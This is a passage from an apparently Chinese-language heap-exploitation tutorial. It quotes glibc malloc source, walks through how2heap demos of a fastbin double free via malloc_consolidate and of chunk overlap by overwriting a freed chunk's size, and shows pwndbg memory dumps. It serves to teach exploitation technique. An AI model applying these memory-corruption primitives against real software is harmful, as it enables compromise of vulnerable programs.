<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">unlink_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">	  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">	malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (p-&gt;fd_nextsize == p)</span><br><span class="line">	    fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">	  <span class="keyword">else</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">	      fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">	      p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">	      p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">	  p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="how2heap-glibc-2-23-fastbindup-consolidate"><a href="#how2heap-glibc-2-23-fastbindup-consolidate" class="headerlink" title="how2heap(glibc 2.23 fastbindup consolidate)"></a>how2heap(glibc 2.23 fastbindup consolidate)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(p1, <span class="string">&quot;AAAAAAAA&quot;</span>);</span><br><span class="line">    <span class="type">void</span>* p2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(p2, <span class="string">&quot;BBBBBBBB&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;申請兩個 fastbin 範圍內的 chunk: p1=%p p2=%p\n&quot;</span>, p1, p2);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;先 free p1\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="type">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;去申請 largebin 大小的 chunk，觸發 malloc_consolidate(): p3=%p\n&quot;</span>, p3);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;因為 malloc_consolidate(), p1 會被放到 unsorted bin 中\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;這時候 p1 不在 fastbin 鏈表的頭部了，所以可以再次 free p1 造成 double free\n&quot;</span>);</span><br><span class="line">    <span class="type">void</span>* p4 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(p4, <span class="string">&quot;CCCCCCC&quot;</span>);</span><br><span class="line">    <span class="type">void</span>* p5 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(p5, <span class="string">&quot;DDDDDDDD&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;現在 fastbin 和 unsortedbin 中都放著 p1 的指針，所以我們可以 malloc 兩次都到 p1: %p %p\n&quot;</span>, p4, p5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="tcache-overlap"><a href="#tcache-overlap" class="headerlink" title="tcache overlap"></a>tcache overlap</h2><p>讓不同的chunk發生重疊的狀況</p>
<p>假設chunk A 的data跟chunk B不可寫部份發生重疊可能發生問題</p>
<h3 id="source-code-glibc-2-23"><a href="#source-code-glibc-2-23" class="headerlink" title="source code(glibc 2.23)"></a>source code(glibc 2.23)</h3><p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L4001">https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L4001</a><br>這邊看看backward consolidate source code</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">malloc_consolidate</span><span class="params">(mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="type">int</span>             nextinuse;</span><br><span class="line"></span><br><span class="line">  atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  unsorted_bin = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">    then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">    placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">    until malloc is sure that chunks aren&#x27;t immediately going to be</span></span><br><span class="line"><span class="comment">    reused anyway.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">  fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    p = atomic_exchange_acq (fb, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index (chunksize (p));</span><br><span class="line">	  <span class="keyword">if</span> ((&amp;fastbin (av, idx)) != fb)</span><br><span class="line">	    malloc_printerr (<span class="string">&quot;malloc_consolidate(): invalid chunk size&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	check_inuse_chunk(av, p);</span><br><span class="line">	nextp = p-&gt;fd;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">	size = chunksize (p);</span><br><span class="line">	nextchunk = chunk_at_offset(p, size);</span><br><span class="line">	nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">	  prevsize = prev_size (p);</span><br><span class="line">	  size += prevsize;</span><br><span class="line">	  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">	    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size in fastbins&quot;</span>);</span><br><span class="line">	  unlink_chunk (av, p);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">	  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">	    size += nextsize;</span><br><span class="line">	    unlink_chunk (av, nextchunk);</span><br><span class="line">	  &#125; <span class="keyword">else</span></span><br><span class="line">	    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	  first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">	  unsorted_bin-&gt;fd = p;</span><br><span class="line">	  first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">	    p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	    p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	  set_head(p, size | PREV_INUSE);</span><br><span class="line">	  p-&gt;bk = unsorted_bin;</span><br><span class="line">	  p-&gt;fd = first_unsorted;</span><br><span class="line">	  set_foot(p, size);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">	  size += nextsize;</span><br><span class="line">	  set_head(p, size | PREV_INUSE);</span><br><span class="line">	  av-&gt;top = p;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>2.31後會多檢查prev size跟chunk size大小是否一樣，這邊則沒有</p>
<p>接下來一樣進入unlink<br>後面都一樣，詳情見下方unlink</p>
<h3 id="how2heap-glibc-2-23"><a href="#how2heap-glibc-2-23" class="headerlink" title="how2heap(glibc 2.23)"></a>how2heap(glibc 2.23)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> 這是一個簡單的重疊區塊故事。</span></span><br><span class="line"><span class="comment"> 這個技巧來自</span></span><br><span class="line"><span class="comment"> http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc , <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">intptr_t</span> *p1,*p2,*p3,*p4;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n這是一個簡單的區塊重疊問題\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;我們先分配三個區塊在堆上\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">    p3 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;這三個區塊被分配在以下位置:\np1=%p\np2=%p\np3=%p\n&quot;</span>, p1, p2, p3);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(p1, <span class="string">&#x27;1&#x27;</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">memset</span>(p2, <span class="string">&#x27;2&#x27;</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n現在我們釋放區塊 p2\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;區塊 p2 現在位於未排序的 bin 中，準備為可能的新 malloc() 提供服務，其大小相同\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;現在我們模擬一個溢出，這可以覆蓋已釋放的區塊 p2 的大小。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;對於一個簡單的程序，最後 3 個位的值並不重要；&quot;</span></span><br><span class="line">        <span class="string">&quot;然而，為了保持堆的穩定性，我們最好將最不重要的位標記為 1（prev_inuse），&quot;</span></span><br><span class="line">        <span class="string">&quot;以確保 p1 不會被誤認為是一個空閒區塊。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> evil_chunk_size = <span class="number">0x181</span>;</span><br><span class="line">    <span class="type">int</span> evil_region_size = <span class="number">0x180</span> - <span class="number">8</span>;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;我們將把區塊 p2 的大小設為 %d，這將給我們一個 %d 的區域大小\n&quot;</span>,</span><br><span class="line">         evil_chunk_size, evil_region_size);</span><br><span class="line"></span><br><span class="line">    *(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// 我們正在覆蓋區塊 p2 的 &quot;size&quot; 欄位</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n現在我們分配另一個區塊，其大小等於區塊 p2 修改後的數據大小\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;這次 malloc 將由先前釋放的區塊提供服務，該區塊停留在未排序的 bin 中，&quot;</span></span><br><span class="line">           <span class="string">&quot;其大小已被我們修改\n&quot;</span>);</span><br><span class="line">    p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 已被分配在 %p 並結束於 %p\n&quot;</span>, (<span class="type">char</span> *)p4, (<span class="type">char</span> *)p4+evil_region_size);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p3 開始於 %p 並結束於 %p\n&quot;</span>, (<span class="type">char</span> *)p3, (<span class="type">char</span> *)p3+<span class="number">0x80</span><span class="number">-8</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 應該與 p3 重疊，在這種情況下 p4 包含了所有的 p3。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n現在，任何複製到區塊 p4 的內容都可以覆蓋區塊 p3 中的數據，&quot;</span></span><br><span class="line">        <span class="string">&quot;並且寫入區塊 p3 的數據可以覆蓋存儲在區塊 p4 中的數據。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;讓我們來舉個例子。現在，我們有:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="type">char</span> *)p4);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="type">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n如果我們 memset(p4, &#x27;4&#x27;, %d)，我們將得到:\n&quot;</span>, evil_region_size);</span><br><span class="line">    <span class="built_in">memset</span>(p4, <span class="string">&#x27;4&#x27;</span>, evil_region_size);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="type">char</span> *)p4);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="type">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n如果我們接著 memset(p3, &#x27;3&#x27;, 80)，我們將得到:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="type">char</span> *)p4);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="type">char</span> *)p3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>首先先malloc了三塊，然後memeset到next chunk size前面</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">parseheap</span></span><br><span class="line">addr                prev                size                 status              fd                bk                </span><br><span class="line">0x9f2000            0x0                 0x100                Used                None              None</span><br><span class="line">0x9f2100            0x3131313131313131  0x100                Used                None              None</span><br><span class="line">0x9f2200            0x3232323232323232  0x80                 Used                None              None</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/80xg 0x9f2000 </span><br><span class="line">0x9f2000:	0x0000000000000000	0x0000000000000101</span><br><span class="line">0x9f2010:	0x3131313131313131	0x3131313131313131</span><br><span class="line">0x9f2020:	0x3131313131313131	0x3131313131313131</span><br><span class="line">0x9f2030:	0x3131313131313131	0x3131313131313131</span><br><span class="line">0x9f2040:	0x3131313131313131	0x3131313131313131</span><br><span class="line">0x9f2050:	0x3131313131313131	0x3131313131313131</span><br><span class="line">0x9f2060:	0x3131313131313131	0x3131313131313131</span><br><span class="line">0x9f2070:	0x3131313131313131	0x3131313131313131</span><br><span class="line">0x9f2080:	0x3131313131313131	0x3131313131313131</span><br><span class="line">0x9f2090:	0x3131313131313131	0x3131313131313131</span><br><span class="line">0x9f20a0:	0x3131313131313131	0x3131313131313131</span><br><span class="line">0x9f20b0:	0x3131313131313131	0x3131313131313131</span><br><span class="line">0x9f20c0:	0x3131313131313131	0x3131313131313131</span><br><span class="line">0x9f20d0:	0x3131313131313131	0x3131313131313131</span><br><span class="line">0x9f20e0:	0x3131313131313131	0x3131313131313131</span><br><span class="line">0x9f20f0:	0x3131313131313131	0x3131313131313131</span><br><span class="line">0x9f2100:	0x3131313131313131	0x0000000000000101</span><br><span class="line">0x9f2110:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x9f2120:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x9f2130:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x9f2140:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x9f2150:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x9f2160:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x9f2170:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x9f2180:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x9f2190:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x9f21a0:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x9f21b0:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x9f21c0:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x9f21d0:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x9f21e0:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x9f21f0:	0x3232323232323232	0x3232323232323232</span><br><span class="line">0x9f2200:	0x3232323232323232	0x0000000000000081</span><br><span class="line">0x9f2210:	0x3333333333333333	0x3333333333333333</span><br><span class="line">0x9f2220:	0x3333333333333333	0x3333333333333333</span><br><span class="line">0x9f2230:	0x3333333333333333	0x3333333333333333</span><br><span class="line">0x9f2240:	0x3333333333333333	0x3333333333333333</span><br><span class="line">0x9f2250:	0x3333333333333333	0x3333333333333333</span><br><span class="line">0x9f2260:	0x3333333333333333	0x3333333333333333</span><br><span class="line">0x9f2270:	0x3333333333333333	0x3333333333333333</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>現在我們free掉chunk 2，他會進到unsorted bin</p>
